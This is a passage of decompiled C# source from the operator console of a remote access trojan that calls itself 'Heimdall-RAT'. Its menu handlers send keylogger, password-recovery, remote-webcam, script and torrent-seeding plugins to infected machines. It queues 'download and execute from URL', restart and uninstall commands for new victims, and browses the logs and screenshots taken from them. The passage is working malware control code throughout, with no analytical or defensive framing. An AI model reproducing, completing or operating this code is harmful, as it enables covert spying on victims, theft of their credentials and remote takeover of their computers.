		//IL_003d: Expected O, but got Unknown
		try
		{
			if (!File.Exists(Application.get_StartupPath() + "\\Plugins\\PA.dll"))
			{
				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "IE" + Key + SocketServer.MD5(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\PA.dll")) + Key + val.get_ToolTipText() + Key + Conversions.ToString(true) + Key + "PA" + Key + "PA");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ProcessManagerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		try
		{
			if (!File.Exists(Application.get_StartupPath() + "\\Plugins\\SM.dll"))
			{
				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "IE" + Key + SocketServer.MD5(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\SM.dll")) + Key + val.get_ToolTipText() + Key + Conversions.ToString(true) + Key + "SM" + Key + "SM");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		try
		{
			if (!File.Exists(Application.get_StartupPath() + "\\Plugins\\KE.dll"))
			{
				return;
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "IE" + Key + SocketServer.MD5(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\KE.dll")) + Key + val.get_ToolTipText() + Key + Conversions.ToString(true) + Key + "KE" + Key + "KE");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void OpenFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if (Directory.Exists(Application.get_StartupPath() + "\\Users\\" + val.get_SubItems().get_Item(1).get_Text()))
					{
						Process.Start(Application.get_StartupPath() + "\\Users\\" + val.get_SubItems().get_Item(1).get_Text());
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void SelectAllToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_Items().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Selected(true);
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void UnsellectToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_Items().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Selected(false);
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void PingToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"1");
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "PVC");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void AddToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string text = Interaction.InputBox("Add IP Adress", "Block IP", "127.0.0.1", -1, -1);
		if (text.Length > 0)
		{
			BlockedIP.get_Items().Add(text).get_SubItems()
				.Add(Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.get_Now()))));
		}
	}

	private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = BlockedIP.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.Remove();
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ClearListToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (BlockedIP.get_Items().get_Count() > 0)
		{
			try
			{
				BlockedIP.get_Items().Clear();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void AddCommand_Click(object sender, EventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_0301: Unknown result type (might be due to invalid IL or missing references)
		if (Comands.get_Text().Length == 0)
		{
			MessageBox.Show("Please select a command!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		if ((Comands.get_SelectedIndex() == 0 && Commanddata.get_Text().Length == 0) ? true : false)
		{
			MessageBox.Show("Please add a URL!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		if (Comands.get_SelectedIndex() == 0)
		{
			string text = Interaction.InputBox("File Name and extension", "Heimdall-RAT ", "Client.exe", -1, -1);
			if (text.Length == 0)
			{
				MessageBox.Show("Please add a invalid extension!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
				return;
			}
			try
			{
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = Commandslistview.get_Items().GetEnumerator();
					while (enumerator.MoveNext())
					{
						object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type)null, "SubItems", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)Commanddata.get_Text(), false))
						{
							MessageBox.Show("This command already exists!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
							return;
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			ListViewItem val = Commandslistview.get_Items().Add(Comands.get_Text());
			val.get_SubItems().Add(Commanddata.get_Text());
			val.get_SubItems().Add(Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.get_Now()))));
			val.set_Tag((object)text);
			val.set_ToolTipText(Conversions.ToString(Comands.get_SelectedIndex()));
		}
		if (!((Comands.get_SelectedIndex() == 1) | (Comands.get_SelectedIndex() == 2) | (Comands.get_SelectedIndex() == 3) | (Comands.get_SelectedIndex() == 4)))
		{
			return;
		}
		try
		{
			IEnumerator enumerator2 = default(IEnumerator);
			try
			{
				enumerator2 = Commandslistview.get_Items().GetEnumerator();
				while (enumerator2.MoveNext())
				{
					object objectValue2 = RuntimeHelpers.GetObjectValue(enumerator2.Current);
					if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectGreater(NewLateBinding.LateGet(objectValue2, (Type)null, "ToolTipText", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false), (!Conversions.ToBoolean(Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue2, (Type)null, "ToolTipText", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1, false)) || !Conversions.ToBoolean(Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue2, (Type)null, "ToolTipText", new object[0], (string[])null, (Type[])null, (bool[])null), (object)Comands.get_SelectedIndex(), false))) ? ((object)false) : ((object)true))))
					{
						MessageBox.Show("This command already exists!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
						return;
					}
				}
			}
			finally
			{
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		ListViewItem val2 = Commandslistview.get_Items().Add(Comands.get_Text());
		val2.get_SubItems().Add("Null");
		val2.get_SubItems().Add(Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.get_Now()))));
		val2.set_Tag((object)"Null");
		val2.set_ToolTipText(Convert.ToString(Comands.get_SelectedIndex()));
	}

	private void Comands_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (Comands.get_SelectedIndex() == 0)
		{
			((Control)Commanddata).set_Enabled(true);
			return;
		}
		if (Commanddata.get_Text().Length > 0)
		{
			Commanddata.set_Text((string)null);
		}
		((Control)Commanddata).set_Enabled(false);
	}

	private void RemoveCommandToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Commandslistview.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.Remove();
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void SC(int Sock)
	{
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Commandslistview.get_Items().GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
					string text = ((Operators.CompareString(GeoIP.LookupCountryName(s.IP(ref Sock)), "Unknown", false) != 0) ? (GeoIP.LookupCountryName(s.IP(ref Sock)) + ".png").ToString() : "--.png".ToString());
					if (Conversions.ToDouble(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ToolTipText", new object[0], (string[])null, (Type[])null, (bool[])null))) == 0.0)
					{
						SocketServer socketServer = s;
						object[] array = new object[2]
						{
							Sock,
							Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat("UNV" + Key, URC), Key), "UNI.UNI"), Key), Functions.RandomVariable(5, 8)), Key), "False"), Key), "False"), Key), "True"), Key), NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type)null, "SubItems", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)Key), NewLateBinding.LateGet(objectValue, (Type)null, "Tag", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)Key), (object)"False"), (object)Key), (object)"False"), (object)Key), (object)Functions.GenRandom(1, 10)), (object)".tmp"), (object)Functions.RandomVariable(1, 5)), (object)Key), (object)Functions.RandomVariable(1, 5)), (object)Key), (object)"False")
						};
						bool[] array2 = new bool[2] { true, false };
						NewLateBinding.LateCall((object)socketServer, (Type)null, "Send", array, (string[])null, (Type[])null, array2, true);
						if (array2[0])
						{
							Sock = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
						}
						ListViewItem val = Logs.get_Items().Add(Sock.ToString(), "[ " + Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.get_Now()))) + " ] IP : " + s.IP(ref Sock) + " - Server ID : ????", text);
						val.set_ForeColor(Color.Blue);
						val.get_SubItems().Add("Download and execute from URL");
						val.set_ToolTipText((GeoIP.LookupCountryName(s.IP(ref Sock)) + ".png").ToString());
					}
					else if (Conversions.ToDouble(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ToolTipText", new object[0], (string[])null, (Type[])null, (bool[])null))) == 1.0)
					{
						s.Send(Sock, "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable(5, 8) + Key + "False" + Key + "False" + Key + "False" + Key + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False" + Key + "False" + Key + Functions.GenRandom(1, 10) + ".tmp" + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False");
						ListViewItem val2 = Logs.get_Items().Add(Sock.ToString(), "[ " + Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.get_Now()))) + " ] IP : " + s.IP(ref Sock) + " - Server ID : ????", text);
						val2.set_ForeColor(Color.PaleVioletRed);
						val2.get_SubItems().Add("Uninstall");
						val2.set_ToolTipText(GeoIP.LookupCountryName(s.IP(ref Sock)) + ".png");
					}
					else if (Conversions.ToDouble(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ToolTipText", new object[0], (string[])null, (Type[])null, (bool[])null))) == 2.0)
					{
						s.Send(Sock, "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable(5, 8) + Key + "False" + Key + "True" + Key + "False" + Key + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False" + Key + "False" + Key + Functions.GenRandom(1, 10) + ".tmp" + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False");
						ListViewItem val3 = Logs.get_Items().Add(Sock.ToString(), "[ " + Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.get_Now()))) + " ] IP : " + s.IP(ref Sock) + " - Server ID : ????", text);
						val3.set_ForeColor(Color.MidnightBlue);
						val3.get_SubItems().Add("Restart");
						val3.set_ToolTipText(GeoIP.LookupCountryName(s.IP(ref Sock)) + ".png");
					}
					else if (Conversions.ToDouble(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ToolTipText", new object[0], (string[])null, (Type[])null, (bool[])null))) == 3.0)
					{
						s.Send(Sock, "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable(5, 8) + Key + "True" + Key + "False" + Key + "False" + Key + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False" + Key + "False" + Key + Functions.GenRandom(1, 10) + ".tmp" + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False");
						ListViewItem val4 = Logs.get_Items().Add(Sock.ToString(), "[ " + Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.get_Now()))) + " ] IP : " + s.IP(ref Sock) + " - Server ID : ????", text);
						val4.set_ForeColor(Color.DeepSkyBlue);
						val4.get_SubItems().Add("Close");
						val4.set_ToolTipText(GeoIP.LookupCountryName(s.IP(ref Sock)) + ".png");
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void BlockToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = listV1.get_SelectedItems().GetEnumerator();
			while (enumerator.MoveNext())
			{
				ListViewItem val = (ListViewItem)enumerator.Current;
				ListViewItemCollection items = BlockedIP.get_Items();
				SocketServer socketServer = s;
				ListViewItem val2 = val;
				int num = Conversions.ToInteger(val2.get_ToolTipText());
				string text = socketServer.IP(ref num);
				val2.set_ToolTipText(Conversions.ToString(num));
				items.Add(text).get_SubItems().Add(Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.get_Now()))));
				s.Disconnect(Conversions.ToInteger(val.get_ToolTipText()));
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	private void TorrentSeederToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Expected O, but got Unknown
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("TSF") != null)
		{
			if (listV1.get_SelectedItems().get_Count() == 0)
			{
				return;
			}
			try
			{
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = listV1.get_SelectedItems().GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem val = (ListViewItem)enumerator.Current;
						val.set_Tag((object)"Pause");
						s.Send(Conversions.ToInteger(val.get_ToolTipText()), "IE" + Key + SocketServer.MD5(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\TS.dll")) + Key + val.get_ToolTipText() + Key + "True" + Key + "TS" + Key + "TS");
					}
					return;
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (listV1.get_SelectedItems().get_Count() > 0)
		{
			((Form)MyProject.Forms.Select_Torrent).ShowDialog();
		}
	}

	private void RemoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		if (!File.Exists(Application.get_StartupPath() + "\\Plugins\\RW.dll"))
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					if (Operators.CompareString(val.get_SubItems().get_Item(4).get_Text(), "Yes", false) == 0)
					{
						val.set_Tag((object)"Pause");
						s.Send(Conversions.ToInteger(val.get_ToolTipText()), "IE" + Key + SocketServer.MD5(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\RW.dll")) + Key + val.get_ToolTipText() + Key + "True" + Key + "RW" + Key + "RW");
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ChatToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		if (!File.Exists(Application.get_StartupPath() + "\\Plugins\\CH.dll"))
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "IE" + Key + SocketServer.MD5(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\CH.dll")) + Key + val.get_ToolTipText() + Key + "True" + Key + "CH" + Key + "CH");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void FromScriptToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		if (!File.Exists(Application.get_StartupPath() + "\\Plugins\\SC.dll"))
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "IE" + Key + SocketServer.MD5(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\SC.dll")) + Key + val.get_ToolTipText() + Key + "True" + Key + "SC" + Key + "SC");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public object GTP()
	{
		checked
		{
			object result = default(object);
			try
			{
				if (TreeView1.get_SelectedNode().get_Text().EndsWith(".png"))
				{
					TabControl1.set_SelectedIndex(1);
					PictureBox1.set_ImageLocation(TreeView1.get_SelectedNode().get_ToolTipText());
					((ToolStripItem)ToolStripStatusLabel2).set_Text(TreeView1.get_SelectedNode().get_ToolTipText());
					return result;
				}
				if (TreeView1.get_SelectedNode().get_Text().EndsWith(".Log"))
				{
					TabControl1.set_SelectedIndex(0);
					TextBox1.set_Text(File.ReadAllText(TreeView1.get_SelectedNode().get_ToolTipText()));
					((ToolStripItem)ToolStripStatusLabel1).set_Text(TreeView1.get_SelectedNode().get_ToolTipText());
					return result;
				}
				if (TreeView1.get_SelectedNode().get_Text().EndsWith(".txt"))
				{
					TabControl1.set_SelectedIndex(0);
					TextBox1.set_Text(File.ReadAllText(TreeView1.get_SelectedNode().get_ToolTipText()));
					((ToolStripItem)ToolStripStatusLabel1).set_Text(TreeView1.get_SelectedNode().get_ToolTipText());
					return result;
				}
				if (Operators.ConditionalCompareObjectEqual(TreeView1.get_SelectedNode().get_Tag(), (object)"0", false))
				{
					string[] directories = Directory.GetDirectories(TreeView1.get_SelectedNode().get_ToolTipText());
					int num = directories.Length - 1;
					int num2 = 0;
					while (true)
					{
						int num3 = num2;
						int num4 = num;
						if (num3 > num4)
						{
							break;
						}
						string text = directories[num2];
						TreeNode val = TreeView1.get_SelectedNode().get_Nodes().Add(text, Path.GetFileName(text), 1, 1);
						val.set_ToolTipText(text);
						val.set_Tag((object)"0");
						num2++;
					}
					string[] files = Directory.GetFiles(TreeView1.get_SelectedNode().get_ToolTipText());
					int num5 = files.Length - 1;
					int num6 = 0;
					while (true)
					{
						int num7 = num6;
						int num4 = num5;
						if (num7 > num4)
						{
							break;
						}
						string text2 = files[num6];
						if (Operators.CompareString(Path.GetExtension(text2), ".Log", false) == 0)
						{
							TreeNode val2 = TreeView1.get_SelectedNode().get_Nodes().Add(text2, Path.GetFileName(text2), 2, 2);
							val2.set_ToolTipText(text2);
							val2.set_Tag((object)"0");
						}
						else if (Operators.CompareString(Path.GetExtension(text2), ".txt", false) == 0)
						{
							object obj = TreeView1.get_SelectedNode().get_Nodes().Add(text2, Path.GetFileName(text2), 4, 4);
							NewLateBinding.LateSet(obj, (Type)null, "ToolTipText", new object[1] { text2 }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(obj, (Type)null, "Tag", new object[1] { "0" }, (string[])null, (Type[])null);
						}
						else if (Operators.CompareString(Path.GetExtension(text2), ".png", false) == 0)
						{
							object obj2 = TreeView1.get_SelectedNode().get_Nodes().Add(text2, Path.GetFileName(text2), 3, 3);
							NewLateBinding.LateSet(obj2, (Type)null, "ToolTipText", new object[1] { text2 }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(obj2, (Type)null, "Tag", new object[1] { "0" }, (string[])null, (Type[])null);
						}
						num6++;
					}
					TreeView1.get_SelectedNode().set_Tag((object)"1");
					TreeView1.get_SelectedNode().Expand();
					return result;
				}
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private void REF_Click(object sender, EventArgs e)
	{
		if (!Directory.Exists("Users"))
		{
			return;
		}
		TreeView1.get_Nodes().Clear();
		TreeView1.get_Nodes().Add("Saved Data", "Saved Data", 0, 0);
		string[] directories = Directory.GetDirectories("Users");
		checked
		{
			int num = directories.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = directories[num2];
					TreeNode val = TreeView1.get_Nodes().get_Item(0).get_Nodes()
						.Add(text, Path.GetFileName(text), 0, 0);
					val.set_ToolTipText(text);
					val.set_Tag((object)"0");
					num2++;
					continue;
				}
				break;
			}
		}
	}

	private void TreeView1_KeyPress(object sender, KeyPressEventArgs e)
	{
		try
		{
			if (Operators.CompareString(Conversions.ToString(e.get_KeyChar()), "\r", false) == 0)
			{
				GTP();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void TreeView1_NodeMouseDoubleClick(object sender, TreeNodeMouseClickEventArgs e)
	{
		try
		{
			GTP();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void l1_ColumnClick(object sender, ColumnClickEventArgs e)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Invalid comparison between Unknown and I4
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToDouble(listV1.get_Items().get_Count().ToString()) != 0.0)
		{
			ColumnHeader val = listV1.get_Columns().get_Item(e.get_Column());
			SortOrder val2;
			if (m_SortingColumn == null)
			{
				val2 = (SortOrder)1;
			}
			else
			{
				val2 = ((!((object)val).Equals((object?)m_SortingColumn)) ? ((SortOrder)1) : ((!Conversions.ToBoolean(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "StartsWith", new object[1] { "> " }, (string[])null, (Type[])null, (bool[])null))) ? ((SortOrder)1) : ((SortOrder)2)));
				m_SortingColumn.set_Tag(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(m_SortingColumn.get_Tag(), (Type)null, "Substring", new object[1] { 2 }, (string[])null, (Type[])null, (bool[])null)));
			}
			m_SortingColumn = val;
			if ((int)val2 == 1)
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"> ", m_SortingColumn.get_Tag()));
			}
			else
			{
				m_SortingColumn.set_Tag(Operators.ConcatenateObject((object)"< ", m_SortingColumn.get_Tag()));
			}
			listV1.set_ListViewItemSorter((IComparer)new ListViewItemComparer(e.get_Column(), val2));
			listV1.Sort();
		}
	}

	private void Button4_Click(object sender, EventArgs e)
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		if (listV1.get_Items().get_Count() > 0)
		{
			try
			{
				PM.set_Image((Image)PM.get_ErrorImage().Clone());
				Label1.set_Text("..");
				CLC();
				((Control)PM).Refresh();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			((Control)REFF).set_Enabled(false);
			Thread thread = new Thread(DW);
			thread.Start();
		}
	}

	private void PM_Paint(object sender, PaintEventArgs e)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
